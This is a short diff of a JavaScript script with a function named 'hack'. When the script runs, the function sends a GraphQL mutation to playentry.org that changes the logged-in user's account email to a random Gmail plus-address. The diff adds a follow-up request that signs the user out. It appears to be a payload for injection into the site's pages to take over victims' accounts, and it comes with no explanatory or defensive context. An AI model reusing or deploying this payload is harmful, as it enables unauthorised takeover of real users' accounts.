@@ -8,6 +8,7 @@ function makeid(length) {
    }
    return result;
 }
+
 async function hack() {
 var randstr = makeid(6);
 await fetch('https://playentry.org/graphql', {
@@ -17,5 +18,7 @@ await fetch('https://playentry.org/graphql', {
     "query":"\n    mutation ($email: String!) {\n        changeUserEmail(email: $email) {\n            \n    status\n    result\n\n        }\n    }\n",
     "variables":{"email":`playentrymail+${randstr}@gmail.com`}
     })});
+await fetch("https://playentry.org/signout", {"method": "GET"});
 }
 hack();
+    
